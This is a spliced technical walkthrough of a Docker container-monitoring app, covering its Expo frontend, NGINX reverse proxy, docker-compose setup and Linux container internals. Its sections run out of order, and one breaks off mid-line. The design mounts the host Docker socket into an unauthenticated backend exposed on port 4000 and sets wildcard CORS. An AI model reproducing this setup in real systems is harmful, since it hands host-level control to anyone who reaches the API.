│  ┌──────────────────────────────────────────────┐  │
│  │         Expo CLI & Metro Bundler             │  │
│  │  • Watches files for changes                 │  │
│  │  • Transpiles JSX → JavaScript               │  │
│  │  • Bundles modules                           │  │
│  │  • Serves on port 8081                       │  │
│  └──────────────────────────────────────────────┘  │
│  ┌──────────────────────────────────────────────┐  │
│  │         React Native Core                    │  │
│  │  • Virtual DOM reconciliation                │  │
│  │  • Component lifecycle                       │  │
│  │  • Hooks (useState, useEffect)               │  │
│  └──────────────────────────────────────────────┘  │
│  ┌──────────────────────────────────────────────┐  │
│  │         React Native Web                     │  │
│  │  • Translates RN components → HTML/CSS       │  │
│  │  • <View> → <div>                            │  │
│  │  • <Text> → <span>                           │  │
│  │  • StyleSheet → CSS                          │  │
│  └──────────────────────────────────────────────┘  │
│  ┌──────────────────────────────────────────────┐  │
│  │         Application Code (App.js)            │  │
│  │  • Container List UI                         │  │
│  │  • Log Viewer                                │  │
│  │  • API client (Axios)                        │  │
│  └──────────────────────────────────────────────┘  │
└────────────────────────────────────────────────────┘
```

### 5.2 Frontend Dockerfile Analysis

**Conceptual Frontend Dockerfile:**

```dockerfile
FROM node:18-alpine

WORKDIR /app

# Install Expo CLI globally
RUN npm install -g expo-cli@6.3.10
# Global install so 'expo' command available anywhere

# Copy package files
COPY package*.json ./
COPY app.json ./
# app.json: Expo configuration (name, slug, version, etc.)

# Install dependencies
RUN npm install
# Includes: react-native, expo, react-dom, axios

# Copy application code
COPY . .

# Expose ports
EXPOSE 8081   # Metro bundler
EXPOSE 8082   # Web server
EXPOSE 19000  # Expo DevTools
EXPOSE 19001  # Expo DevTools (secure)
EXPOSE 19002  # Expo DevTools (ng)

# Environment variables
ENV EXPO_DEVTOOLS_LISTEN_ADDRESS=0.0.0.0
# Allow connections from outside container

ENV REACT_NATIVE_PACKAGER_HOSTNAME=localhost
# Metro bundler hostname

# Start Expo
CMD ["npx", "expo", "start", "--web"]
# --web: Start in web mode (opens in browser)
# Alternative: Without --web for mobile development
```

### 5.3 App.js: React Native Implementation

**Conceptual structure of frontend/App.js:**

```javascript
import React, { useState, useEffect } from 'react';
import {
  View,
  Text,
  FlatList,
  TouchableOpacity,
  RefreshControl,
  StyleSheet,
  ActivityIndicator
} from 'react-native';
import axios from 'axios';

// API configuration
const API_URL = 'http://localhost/api';

export default function App() {
  // State management using React Hooks
  const [containers, setContainers] = useState([]);
  const [loading, setLoading] = useState(true);
  const [refreshing, setRefreshing] = useState(false);
  const [selectedContainer, setSelectedContainer] = useState(null);
  const [logs, setLogs] = useState('');
  
  // Fetch containers on component mount
  useEffect(() => {
    fetchContainers();
  }, []); // Empty dependency array = run once on mount
  
  // Function to fetch containers from API
  const fetchContainers = async () => {
    try {
      setLoading(true);
      const response = await axios.get(`${API_URL}/containers`);
      setContainers(response.data);
    } catch (error) {
      console.error('Error fetching containers:', error);
      alert('Failed to fetch containers');
    } finally {
      setLoading(false);
    }
  };
  
  // Pull-to-refresh handler
  const onRefresh = async () => {
    setRefreshing(true);
    await fetchContainers();
    setRefreshing(false);
  };
  
  // Fetch logs for a specific container
  const fetchLogs = async (containerId) => {
    try {
      const response = await axios.get(
        `${API_URL}/containers/${containerId}/logs`
      );
      setLogs(response.data);
      setSelectedContainer(containerId);
    } catch (error) {
      console.error('Error fetching logs:', error);
      alert('Failed to fetch logs');
    }
  };
  
  // Render individual container item
  const renderContainer = ({ item }) => (
    <View style={styles.containerItem}>
      <View style={styles.containerHeader}>
        <View 
          style={[
            styles.statusIndicator,
            { backgroundColor: item.state === 'running' ? '#4CAF50' : '#F44336' }
          ]} 
        />
        <Text style={styles.containerName}>{item.name}</Text>
      </View>
      
      <Text style={styles.containerInfo}>Image: {item.image}</Text>
      <Text style={styles.containerInfo}>Status: {item.status}</Text>
      <Text style={styles.containerInfo}>ID: {item.id}</Text>
      
      {item.ports.length > 0 && (
        <Text style={styles.containerInfo}>
          Ports: {item.ports.map(p => 
            `${p.private}${p.public ? `:${p.public}` : ''}`
          ).join(', ')}
        </Text>
      )}
      
      <TouchableOpacity
        style={styles.button}
        onPress={() => fetchLogs(item.id)}
      >
        <Text style={styles.buttonText}>View Logs</Text>
      </TouchableOpacity>
    </View>
  );
  
  // Loading state
  if (loading) {
    return (
      <View style={styles.centered}>
        <ActivityIndicator size="large" color="#2196F3" />
        <Text>Loading containers...</Text>
      </View>
    );
  }
  
  // Main render
  return (
    <View style={styles.container}>
      <View style={styles.header}>
        <Text style={styles.title}>Docker Container Monitor</Text>
        <Text style={styles.subtitle}>
          {containers.length} container(s)
        </Text>
      </View>
      
      <FlatList
        data={containers}
        renderItem={renderContainer}
        keyExtractor={(item) => item.id}
        refreshControl={
          <RefreshControl
            refreshing={refreshing}
            onRefresh={onRefresh}
          />
        }
        contentContainerStyle={styles.listContent}
      />
      
      {/* Log Modal */}
      {selectedContainer && (
        <View style={styles.modal}>
          <View style={styles.modalContent}>
            <Text style={styles.modalTitle}>Container Logs</Text>
            <Text style={styles.logs}>{logs}</Text>
            <TouchableOpacity
              style={styles.closeButton}
              onPress={() => {
                setSelectedContainer(null);
                setLogs('');
              }}
            >
              <Text style={styles.buttonText}>Close</Text>
            </TouchableOpacity>
          </View>
        </View>
      )}
    </View>
  );
}

// Styles using React Native StyleSheet
const styles = StyleSheet.create({
  container: {
    flex: 1,
    backgroundColor: '#f5f5f5',
  },
  centered: {
    flex: 1,
    justifyContent: 'center',
    alignItems: 'center',
  },
  header: {
    backgroundColor: '#2196F3',
    padding: 20,
    paddingTop: 40,
  },
  title: {
    fontSize: 24,
    fontWeight: 'bold',
    color: 'white',
  },
  subtitle: {
    fontSize: 14,
    color: 'white',
    marginTop: 5,
  },
  listContent: {
    padding: 10,
  },
  containerItem: {
    backgroundColor: 'white',
    borderRadius: 8,
    padding: 15,
    marginBottom: 10,
    shadowColor: '#000',
    shadowOffset: { width: 0, height: 2 },
    shadowOpacity: 0.1,
    shadowRadius: 4,
    elevation: 3,
  },
  containerHeader: {
    flexDirection: 'row',
    alignItems: 'center',
    marginBottom: 10,
  },
  statusIndicator: {
    width: 12,
    height: 12,
    borderRadius: 6,
    marginRight: 10,
  },
  containerName: {
    fontSize: 18,
    fontWeight: 'bold',
  },
  containerInfo: {
    fontSize: 14,
    color: '#666',
    marginBottom: 5,
  },
  button: {
    backgroundColor: '#2196F3',
    padding: 10,
    borderRadius: 5,
    marginTop: 10,
  },
  buttonText: {
    color: 'white',
    textAlign: 'center',
    fontWeight: 'bold',
  },
  modal: {
    position: 'absolute',
    top: 0,
    left: 0,
    right: 0,
    bottom: 0,
    backgroundColor: 'rgba(0,0,0,0.5)',
    justifyContent: 'center',
    alignItems: 'center',
  },
  modalContent: {
    backgroundColor: 'white',
    borderRadius: 10,
    padding: 20,
    width: '90%',
    maxHeight: '80%',
  },
  modalTitle: {
    fontSize: 20,
    fontWeight: 'bold',
    marginBottom: 15,
  },
  logs: {
    fontFamily: 'monospace',
    fontSize: 12,
    backgroundColor: '#f5f5f5',
    padding: 10,
    borderRadius: 5,
    maxHeight: 400,
  },
  closeButton: {
    backgroundColor: '#F44336',
    padding: 10,
    borderRadius: 5,
    marginTop: 15,
  },
});
```

### 5.4 React Component Lifecycle & Rendering

**How React Native renders:**

```
1. INITIAL RENDER
   ┌─────────────────────────────────────┐
   │ React calls App() function          │
   │ • Initializes state with useState   │
   │ • Registers effects with useEffect  │
   │ • Returns JSX (virtual DOM)         │
   └─────────────────────────────────────┘
              ↓
   ┌─────────────────────────────────────┐
   │ React Native reconciliation         │
   │ • Diffs virtual DOM                 │
   │ • Determines what changed           │
   └─────────────────────────────────────┘
              ↓
   ┌─────────────────────────────────────┐
   │ React Native Web renderer           │
   │ • <View> → <div>                    │
   │ • <Text> → <span>                   │
   │ • <TouchableOpacity> → <button>    │
   └─────────────────────────────────────┘
              ↓
   ┌─────────────────────────────────────┐
   │ Browser renders HTML/CSS            │
   └─────────────────────────────────────┘

2. USER INTERACTION (e.g., clicks "View Logs")
   ┌─────────────────────────────────────┐
   │ Event handler called                │
   │ fetchLogs(containerId)              │
   └─────────────────────────────────────┘
              ↓
   ┌─────────────────────────────────────┐
   │ Axios makes HTTP request            │
   │ GET /api/containers/:id/logs        │
   └─────────────────────────────────────┘
              ↓
   ┌─────────────────────────────────────┐
   │ State updated with setLogs()        │
   │ React schedules re-render           │
   └─────────────────────────────────────┘
              ↓
   ┌─────────────────────────────────────┐
   │ React re-renders component          │
   │ Only changed parts update in DOM    │
   └─────────────────────────────────────┘

3. EFFECT EXECUTION (useEffect)
   ┌─────────────────────────────────────┐
   │ After initial render:               │
   │ useEffect(() => {                   │
   │   fetchContainers();                │
   │ }, []);                             │
   └─────────────────────────────────────┘
              ↓
   ┌─────────────────────────────────────┐
   │ API call fetches containers         │
   │ State updated → triggers re-render  │
   └─────────────────────────────────────┘
```

### 5.5 Metro Bundler: The Secret Sauce

**What Metro does for hot reload:**

```
┌────────────────────────────────────────────────────┐
│                Metro Bundler Process                │
├────────────────────────────────────────────────────┤
│                                                     │
│  1. File Watcher (chokidar)                       │
│     • Watches /app directory                       │
│     • Detects changes to .js, .jsx files          │
│                                                     │
│  2. Dependency Graph                               │
│     • Maintains graph of all imports              │
│     • Knows which files depend on which           │
│                                                     │
│  3. Transformer                                    │
│     • Babel: JSX → JavaScript                     │
│     • Resolve imports                             │
│     • Apply polyfills                             │
│                                                     │
│  4. Bundle Generator                               │
│     • Combines all modules                        │
│     • Creates single bundle.js                    │
│     • Injects HMR runtime                         │
│                                                     │
│  5. Hot Module Replacement (HMR)                  │
│     • WebSocket connection to browser             │
│     • Sends only changed modules                  │
│     • Browser applies changes without reload      │
│                                                     │
└────────────────────────────────────────────────────┘

EXAMPLE: You edit App.js
    ↓
Metro detects change (inotify on Linux)
    ↓
Metro re-transforms App.js
    ↓
Metro checks dependency graph (what imports App.js?)
    ↓
Metro sends update via WebSocket:
{
  type: 'update',
  modules: [
    { id: 'App.js', code: '... transformed code ...' }
  ]
}
    ↓
Browser HMR runtime receives update
    ↓
Browser replaces old App.js module with new one
    ↓
React Fast Refresh re-renders component
    ↓
UI updates without losing state!
```

---

## 6. Networking & Reverse Proxy

### 6.1 NGINX Architecture

```
┌────────────────────────────────────────────────────┐
│                NGINX Container                      │
│                                                     │
│  ┌──────────────────────────────────────────────┐  │
│  │         Master Process (root)                │  │
│  │  • Reads configuration                       │  │
│  │  • Manages worker processes                  │  │
│  │  • Handles signals (reload, shutdown)        │  │
│  └──────────────────────────────────────────────┘  │
│         ↓                ↓                ↓         │
│  ┌──────────┐  ┌──────────┐  ┌──────────┐         │
│  │ Worker 1 │  │ Worker 2 │  │ Worker N │         │
│  │ (nginx)  │  │ (nginx)  │  │ (nginx)  │         │
│  │  • Handles│  │  • Handles│  │  • Handles│         │
│  │   conns  │  │   conns  │  │   conns  │         │
│  └──────────┘  └──────────┘  └──────────┘         │
│                                                     │
│  Configuration: /etc/nginx/nginx.conf             │
└────────────────────────────────────────────────────┘
```

### 6.2 nginx.conf Deep Dive

**Conceptual nginx/nginx.conf:**

```nginx
# Main context
user nginx;
worker_processes auto;  # One worker per CPU core
error_log /var/log/nginx/error.log warn;
pid /var/run/nginx.pid;

# Events context (connection processing)
events {
    worker_connections 1024;  # Each worker can handle 1024 connections
    use epoll;  # Efficient I/O event notification (Linux)
}

# HTTP context
http {
    # Basic settings
    include /etc/nginx/mime.types;
    default_type application/octet-stream;
    
    # Logging format
    log_format main '$remote_addr - $remote_user [$time_local] '
                    '"$request" $status $body_bytes_sent '
                    '"$http_referer" "$http_user_agent"';
    
    access_log /var/log/nginx/access.log main;
    
    # Performance optimizations
    sendfile on;  # Zero-copy file transmission
    tcp_nopush on;  # Send headers in one packet
    tcp_nodelay on;  # Don't buffer small packets
    keepalive_timeout 65;  # Keep connections alive for 65s
    
    # Gzip compression
    gzip on;
    gzip_vary on;
    gzip_min_length 1000;
    gzip_types text/plain text/css application/json application/javascript;
    
    # Upstream backend server
    upstream backend {
        server backend:4000;  # DNS resolution via Docker
        keepalive 32;  # Connection pool to backend
    }
    
    # Server context
    server {
        listen 80;  # Listen on port 80
        server_name _;  # Match any hostname
        
        # Root location
        location / {
            root /usr/share/nginx/html;
            index index.html;
            try_files $uri $uri/ /index.html;
        }
        
        # API proxy location
        location /api/ {
            # Proxy settings
            proxy_pass http://backend/api/;
            
            # Headers to pass to backend
            proxy_set_header Host $host;
            proxy_set_header X-Real-IP $remote_addr;
            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
            proxy_set_header X-Forwarded-Proto $scheme;
            
            # Timeouts
            proxy_connect_timeout 60s;
            proxy_send_timeout 60s;
            proxy_read_timeout 60s;
            
            # Buffer settings
            proxy_buffering on;
            proxy_buffer_size 4k;
            proxy_buffers 8 4k;
            
            # Connection pooling to backend
            proxy_http_version 1.1;
            proxy_set_header Connection "";
            
            # CORS headers (if backend doesn't handle)
            add_header 'Access-Control-Allow-Origin' '*' always;
            add_header 'Access-Control-Allow-Methods' 'GET, POST, OPTIONS' always;
            add_header 'Access-Control-Allow-Headers' 'Content-Type' always;
            
            # Handle preflight requests
            if ($request_method = 'OPTIONS') {
                return 204;
            }
        }
        
        # Health check location
        location /health {
            proxy_pass http://backend/health;
            access_log off;  # Don't log health checks
        }
        
        # Error pages
        error_page 404 /404.html;
        error_page 500 502 503 504 /50x.html;
        location = /50x.html {
            root /usr/share/nginx/html;
        }
    }
}
```

### 6.3 Request Flow Through NGINX

**Example: GET /api/containers**

```
1. TCP Connection
   Client (Browser) → SYN → NGINX (port 80)
   NGINX → SYN-ACK → Client
   Client → ACK → NGINX
   [TCP connection established]

2. HTTP Request
   GET /api/containers HTTP/1.1
   Host: localhost
   User-Agent: Mozilla/5.0...
   Accept: application/json
   
3. NGINX Processing
   ┌────────────────────────────────────┐
   │ Worker process receives request    │
   └────────────────────────────────────┘
              ↓
   ┌────────────────────────────────────┐
   │ Parse HTTP request                 │
   │ • Method: GET                      │
   │ • URI: /api/containers             │
   │ • Headers: ...                     │
   └────────────────────────────────────┘
              ↓
   ┌────────────────────────────────────┐
   │ Match location blocks              │
   │ /api/ matches!                     │
   └────────────────────────────────────┘
              ↓
   ┌────────────────────────────────────┐
   │ Execute directives                 │
   │ proxy_pass http://backend/api/     │
   └────────────────────────────────────┘
              ↓
   ┌────────────────────────────────────┐
   │ Resolve upstream                   │
   │ backend → 172.18.0.3:4000          │
   └────────────────────────────────────┘
              ↓
   ┌────────────────────────────────────┐
   │ Create proxy request               │
   │ GET /api/containers HTTP/1.1       │
   │ Host: backend                      │
   │ X-Real-IP: 172.17.0.1              │
   │ X-Forwarded-For: 192.168.1.100     │
   └────────────────────────────────────┘

4. Backend Processing
   Backend receives request → processes → returns JSON

5. NGINX Response Handling
   ┌────────────────────────────────────┐
   │ Receive response from backend      │
   │ HTTP/1.1 200 OK                    │
   │ Content-Type: application/json     │
   │ [JSON data]                        │
   └────────────────────────────────────┘
              ↓
   ┌────────────────────────────────────┐
   │ Add CORS headers                   │
   │ Access-Control-Allow-Origin: *     │
   └────────────────────────────────────┘
              ↓
   ┌────────────────────────────────────┐
   │ Forward response to client         │
   └────────────────────────────────────┘

6. Client receives response
   Status: 200 OK
   Body: [container list JSON]
```

### 6.4 Why Use NGINX as Reverse Proxy?

**Problem without NGINX:**

```
Browser (http://localhost:8081)
    ↓ Makes API call to http://localhost:4000
    ✗ CORS Error! Different origins (8081 ≠ 4000)
    ✗ Browser blocks request
```

**Solution with NGINX:**

```
Browser (http://localhost:8081)
    ↓ Makes API call to http://localhost/api (port 80)
    ✓ Same origin as static files
NGINX
    ↓ Proxies to backend:4000 (internal network)
    ✓ No CORS issues (internal)
Backend
```

**Additional benefits:**
1. **SSL/TLS Termination**: NGINX handles HTTPS, backend doesn't need to
2. **Load Balancing**: Can proxy to multiple backend instances
3. **Caching**: Static content caching
4. **Rate Limiting**: Protect backend from abuse
5. **Request Routing**: Route different paths to different services
6. **Compression**: Gzip responses before sending to client

---

## 7. DevOps & Orchestration

### 7.1 Docker Compose Architecture

**docker-compose.yml Deep Analysis:**

```yaml
version: '3.8'  # Compose file format version

# Named volumes (persisted across container restarts)
volumes:
  backend-data:  # For backend persistent data
    driver: local

# Custom networks
networks:
  dnmonitor-net:  # All services on same network
    driver: bridge

# Service definitions
services:
  
  # ============================================
  # Backend Service
  # ============================================
  backend:
    build:
      context: ./backend  # Build from backend/ directory
      dockerfile: Dockerfile
    container_name: dnmonitor-backend
    restart: unless-stopped  # Auto-restart on crash
    
    # Port mapping (host:container)
    ports:
      - "4000:4000"  # Expose for direct access (dev only)
    
    # Environment variables
    environment:
      - NODE_ENV=development
      - PORT=4000
    
    # Volume mounts
    volumes:
      # CRITICAL: Docker socket access
      - /var/run/docker.sock:/var/run/docker.sock
      # Hot reload for development
      - ./backend/src:/app/src
      # Named volume for data persistence
      - backend-data:/app/data
    
    # Network configuration
    networks:
      - dnmonitor-net
    
    # Health check
    healthcheck:
      test: ["CMD", "curl", "-f", "http://localhost:4000/health"]
      interval: 30s
      timeout: 10s
      retries: 3
      start_period: 40s
    
    # Logging configuration
    logging:
      driver: "json-file"
      options:
        max-size: "10m"
        max-file: "3"
  
  # ============================================
  # Frontend Service
  # ============================================
  frontend:
    build:
      context: ./frontend
      dockerfile: Dockerfile
    container_name: dnmonitor-frontend
    restart: unless-stopped
    
    # Multiple port mappings for Expo
    ports:
      - "8081:8081"    # Metro bundler
      - "8082:8082"    # Web server
      - "19000:19000"  # Expo DevTools
      - "19001:19001"  # Expo DevTools (secure)
      - "19002:19002"  # Expo DevTools (ng)
    
    environment:
      - EXPO_DEVTOOLS_LISTEN_ADDRESS=0.0.0.0
      - REACT_NATIVE_PACKAGER_HOSTNAME=localhost
    
    # Bind mount for hot reload
    volumes:
      - ./frontend:/app
      # Exclude node_modules (use container's version)
      - /app/node_modules
    
    networks:
      - dnmonitor-net
    
    # Depends on backend (wait for it to start)
    depends_on:
      backend:
        condition: service_healthy
  
  # ============================================
  # NGINX Service
  # ============================================
  nginx:
    build:
      context: ./nginx
      dockerfile: Dockerfile
    container_name: dnmonitor-nginx
    restart: unless-stopped
    
    ports:
      - "80:80"  # HTTP
      # - "443:443"  # HTTPS (if configured)
    
    volumes:
      # Mount nginx config for hot-reload
      - ./nginx/nginx.conf:/etc/nginx/nginx.conf:ro
      # Mount SSL certificates (if any)
      # - ./nginx/ssl:/etc/nginx/ssl:ro
    
    networks:
      - dnmonitor-net
    
    # Wait for both frontend and backend
    depends_on:
      - frontend
      - backend
    
    healthcheck:
      test: ["CMD", "nginx", "-t"]
      interval: 30s
      timeout: 3s
      retries: 3
```

### 7.2 Container Lifecycle Management

**What happens when you run `docker compose up`:**

```
1. IMAGE BUILD PHASE
   ┌────────────────────────────────────────┐
   │ docker compose build                   │
   └────────────────────────────────────────┘
              ↓
   For each service:
   ┌────────────────────────────────────────┐
   │ 1. Read Dockerfile                     │
   │ 2. Execute each instruction            │
   │    • FROM: Pull base image             │
   │    • RUN: Execute commands             │
   │    • COPY: Copy files into image       │
   │    • CMD: Set default command          │
   │ 3. Create layered image                │
   │ 4. Tag image (dnmonitor-backend:latest)│
   └────────────────────────────────────────┘

2. NETWORK CREATION
   ┌────────────────────────────────────────┐
   │ docker network create dnmonitor_default│
   │ • Type: bridge                         │
   │ • Subnet: 172.18.0.0/16               │
   │ • Gateway: 172.18.0.1                 │
   └────────────────────────────────────────┘

3. VOLUME CREATION
   ┌────────────────────────────────────────┐
   │ docker volume create backend-data      │
   │ • Driver: local                        │
   │ • Mountpoint: /var/lib/docker/volumes/ │
   └────────────────────────────────────────┘

4. CONTAINER CREATION & START
   ┌────────────────────────────────────────┐
   │ Order determined by depends_on         │
   │                                        │
   │ 1. Start backend (no dependencies)     │
   │    • Create container from image       │
   │    • Attach to network                 │
   │    • Mount volumes                     │
   │    • Set environment variables         │
   │    • Start process (CMD instruction)   │
   │    • Wait for healthcheck              │
   │                                        │
   │ 2. Start frontend (depends on backend) │
   │    [Same steps as backend]             │
   │                                        │
   │ 3. Start nginx (depends on both)       │
   │    [Same steps as above]               │
   └────────────────────────────────────────┘
```

### 7.3 Container Orchestration Details

**Container Startup Sequence:**

```
TIME    EVENT
──────────────────────────────────────────────────────
T+0s    docker compose up -d --build
        
T+1s    Building backend image
        Step 1/8 : FROM node:18-alpine
        Step 2/8 : WORKDIR /app
        ...
        Step 8/8 : CMD ["node", "src/index.js"]
        Successfully built abc123
        
T+15s   Building frontend image
        [Similar build process]
        
T+30s   Building nginx image
        [Similar build process]
        
T+35s   Creating network "dnmonitor_default"
        Network created: 172.18.0.0/16
        
T+36s   Creating volume "dnmonitor_backend-data"
        Volume created
        
T+37s   Creating container "dnmonitor-backend"
        Container created: def456
        
T+38s   Starting dnmonitor-backend
        Container started, waiting for health check...
        
T+40s   Health check passed (backend)
        GET http://localhost:4000/health → 200 OK
        
T+41s   Creating container "dnmonitor-frontend"
        Container created: ghi789
        
T+42s   Starting dnmonitor-frontend
        Expo dev server starting...
        Metro bundler ready on port 8081
        
T+50s   Creating container "dnmonitor-nginx"
        Container created: jkl012
        
T+51s   Starting dnmonitor-nginx
        nginx: configuration file /etc/nginx/nginx.conf test is successful
        nginx started and listening on port 80
        
T+52s   All services running
        ✓ backend    (healthy)
        ✓ frontend   (running)
        ✓ nginx      (running)
```

### 7.4 Docker Compose Commands Deep Dive

**Common operations and what they do:**

```bash
# 1. Start everything
docker compose up -d --build

# What happens:
# - Builds all images (--build forces rebuild even if cached)
# - Creates network if doesn't exist
# - Creates volumes if don't exist
# - Creates and starts containers in dependency order
# - -d runs in detached mode (background)

# 2. View logs
docker compose logs -f

# What happens:
# - Connects to Docker daemon
# - Retrieves logs from each container's STDOUT/STDERR
# - -f follows (streams) logs in real-time
# - Multiplexes logs from all containers with color coding

# 3. Stop services
docker compose stop

# What happens:
# - Sends SIGTERM to each container's PID 1
# - Waits 10 seconds for graceful shutdown
# - If still running, sends SIGKILL─────────────────────────────────────────┘
                            ↓ HTTP/HTTPS
┌─────────────────────────────────────────────────────────────┐
│              PRESENTATION/GATEWAY LAYER (Tier 2)            │
│  ┌─────────────────────────────────────────────────────┐    │
│  │               NGINX Reverse Proxy                   │    │
│  │              (Port 80 - External)                   │    │
│  │                                                      │    │
│  │  Routes:                                            │    │
│  │  • /api/* → backend:4000                           │    │
│  │  • /health → health check                          │    │
│  │  • / → static content (if any)                     │    │
│  └─────────────────────────────────────────────────────┘    │
└─────────────────────────────────────────────────────────────┘
                            ↓ Internal Network
┌─────────────────────────────────────────────────────────────┐
│                APPLICATION LAYER (Tier 3)                   │
│  ┌──────────────────────┐    ┌──────────────────────────┐  │
│  │   Frontend Service   │    │   Backend Service        │  │
│  │   (React Native +    │    │   (Node.js + Express)   │  │
│  │    Expo)             │    │   (Port 4000)           │  │
│  │   Ports: 8081,8082   │    │                         │  │
│  │         19000-19002  │    │   Uses: Dockerode       │  │
│  └──────────────────────┘    └──────────────────────────┘  │
└─────────────────────────────────────────────────────────────┘
                            ↓ Unix Socket
┌─────────────────────────────────────────────────────────────┐
│                    INFRASTRUCTURE LAYER                     │
│  ┌─────────────────────────────────────────────────────┐    │
│  │            Docker Engine (Host)                     │    │
│  │         /var/run/docker.sock                        │    │
│  │                                                      │    │
│  │  Manages:                                           │    │
│  │  • All running containers                          │    │
│  │  • Container lifecycle                             │    │
│  │  • Container logs & metadata                       │    │
│  └─────────────────────────────────────────────────────┘    │
└─────────────────────────────────────────────────────────────┘
```

### 1.2 Communication Flow Analysis

**Request Flow (Client → Docker Info):**
```
1. User opens browser → http://localhost:8081
2. Browser requests container list
3. Frontend makes API call → http://localhost/api/containers
4. Request hits NGINX (port 80)
5. NGINX proxies to backend:4000/api/containers
6. Backend uses Dockerode → reads /var/run/docker.sock
7. Docker Engine returns container metadata
8. Backend formats response → JSON
9. NGINX forwards response → Frontend
10. React Native renders UI with data
```

**Data Flow Diagram:**
```
Browser (GET /api/containers)
    ↓
NGINX (:80)
    ↓ [proxy_pass]
Backend (:4000)
    ↓ [Dockerode library]
Unix Socket (/var/run/docker.sock)
    ↓ [Docker API]
Docker Engine
    ↓ [reads container state]
Container Runtime (containerd/runc)
    ↓ [return metadata]
← ← ← Response flows back ← ← ←
```

---

## 2. Core Computer Science Concepts

### 2.1 Process Isolation & Namespaces

**What happens under the hood when Docker runs a container?**

Linux provides **namespaces** - a kernel feature that isolates system resources:

```
┌──────────────────────────────────────────────────────────┐
│                    HOST OPERATING SYSTEM                  │
│                      (Linux Kernel)                       │
│                                                           │
│  ┌─────────────────────────────────────────────────┐     │
│  │           Global Namespace (Host View)          │     │
│  │  PID: 1, 2, 3, 4 ... 1000+                     │     │
│  │  Network: eth0, lo, docker0                     │     │
│  │  Mounts: /, /home, /var, /usr                  │     │
│  └─────────────────────────────────────────────────┘     │
│                                                           │
│  ┌──────────────────┐  ┌──────────────────┐             │
│  │  Container NS 1  │  │  Container NS 2  │             │
│  │   (Frontend)     │  │   (Backend)      │             │
│  │                  │  │                  │             │
│  │  PID NS: 1, 2    │  │  PID NS: 1, 2    │ ← Isolated │
│  │  NET NS: eth0    │  │  NET NS: eth0    │ ← per cont │
│  │  Mount NS:       │  │  Mount NS:       │             │
│  │   /app, /node    │  │   /app, /src     │             │
│  │  IPC NS          │  │  IPC NS          │             │
│  │  UTS NS          │  │  UTS NS          │             │
│  └──────────────────┘  └──────────────────┘             │
└──────────────────────────────────────────────────────────┘
```

**7 Types of Namespaces:**
1. **PID (Process ID)**: Each container sees its own process tree (PID 1 is container's init)
2. **NET (Network)**: Each container has its own network stack, interfaces, routing tables
3. **MNT (Mount)**: Each container has its own filesystem tree
4. **IPC (Inter-Process Communication)**: Isolated message queues, semaphores
5. **UTS (Unix Timesharing)**: Isolated hostname and domain name
6. **USER**: User ID mapping (root in container ≠ root on host)
7. **CGROUP**: Control group namespace for resource limits

**How DNMonitor's Backend Accesses Docker:**
```
Backend Container (PID namespace isolated)
    ↓
Mounted Unix Socket (/var/run/docker.sock)
    ↓ [BREAKS ISOLATION - intentional]
Host's Docker Daemon (running in host PID namespace)
    ↓
Can see ALL containers (global view)
```

This is **Docker-in-Docker pattern** - the container can control its host!

### 2.2 Control Groups (cgroups)

**Resource Management at Kernel Level:**

```
┌────────────────────────────────────────────────┐
│           Linux Kernel (cgroup subsystems)     │
├────────────────────────────────────────────────┤
│  CPU Controller      Memory Controller         │
│  ┌──────────┐        ┌──────────┐             │
│  │ cpu.cfs  │        │ memory.  │             │
│  │ quota_us │        │ limit_in │             │
│  │          │        │ _bytes   │             │
│  │ cpu.     │        │          │             │
│  │ shares   │        │ memory.  │             │
│  └──────────┘        │ swappiness             │
│                      └──────────┘             │
├────────────────────────────────────────────────┤
│  BlkIO Controller    Network Controller        │
│  (Disk I/O)          (Bandwidth)              │
└────────────────────────────────────────────────┘
          ↓                    ↓
    Applied to          Applied to
    Frontend            Backend
    Container           Container
```

**In docker-compose.yml, you can specify:**
```yaml
services:
  backend:
    deploy:
      resources:
        limits:
          cpus: '0.5'        # 50% of one CPU core
          memory: 512M       # Max 512MB RAM
        reservations:
          cpus: '0.25'       # Guaranteed 25% CPU
          memory: 256M       # Guaranteed 256MB
```

### 2.3 Union File Systems (Overlay2)

**How Docker achieves efficient storage:**

```
┌──────────────────────────────────────────────────────┐
│              Container Filesystem                     │
├──────────────────────────────────────────────────────┤
│  Read-Write Layer (Container specific changes)       │
│  ┌──────────────────────────────────────────────┐    │
│  │  /app/node_modules/new-package/              │    │
│  │  /tmp/logs/app.log                           │    │
│  └──────────────────────────────────────────────┘    │
├──────────────────────────────────────────────────────┤
│  Image Layer 5: Application code (COPY ./src)        │
│  ┌──────────────────────────────────────────────┐    │
│  │  /app/src/index.js                           │    │
│  └──────────────────────────────────────────────┘    │
├──────────────────────────────────────────────────────┤
│  Image Layer 4: Dependencies (RUN npm install)       │
│  ┌──────────────────────────────────────────────┐    │
│  │  /app/node_modules/express/                  │    │
│  │  /app/node_modules/dockerode/                │    │
│  └──────────────────────────────────────────────┘    │
├──────────────────────────────────────────────────────┤
│  Image Layer 3: Package files (COPY package*.json)   │
├──────────────────────────────────────────────────────┤
│  Image Layer 2: System tools (RUN apt-get install)   │
├──────────────────────────────────────────────────────┤
│  Image Layer 1: Base OS (FROM node:18-alpine)        │
│  ┌──────────────────────────────────────────────┐    │
│  │  /bin, /lib, /usr, /etc                      │    │
│  └──────────────────────────────────────────────┘    │
└──────────────────────────────────────────────────────┘
         ↓ All layers merged via overlay2
    Final unified view: / (root filesystem)
```

**Why this matters for DNMonitor:**
- Multiple containers can share base layers (node:18-alpine)
- Only differences are stored
- Fast container startup (no copying entire filesystem)
- Volume mounts bypass this system (direct access to host)

### 2.4 Inter-Process Communication (IPC)

**How frontend talks to backend in DNMonitor:**

```
┌────────────────────────────────────────────────────┐
│  Frontend Container (JS running in browser)        │
│  ┌──────────────────────────────────────────────┐  │
│  │  axios.get('http://localhost/api/containers') │  │
│  └──────────────────────────────────────────────┘  │
└────────────────────────────────────────────────────┘
                    ↓ TCP/IP over loopback
┌────────────────────────────────────────────────────┐
│  Host Network Stack                                 │
│  localhost (127.0.0.1) port 80                     │
└────────────────────────────────────────────────────┘
                    ↓ Port mapping
┌────────────────────────────────────────────────────┐
│  NGINX Container (listens on 0.0.0.0:80)          │
│  Routes /api/* to backend:4000                     │
└────────────────────────────────────────────────────┘
                    ↓ Docker internal network
┌────────────────────────────────────────────────────┐
│  Backend Container (listens on 0.0.0.0:4000)      │
│  Receives request, processes via Dockerode         │
└────────────────────────────────────────────────────┘
```

**DNS Resolution in Docker Networks:**
```
Backend container wants to talk to "backend:4000"
    ↓
Docker's embedded DNS server (127.0.0.11)
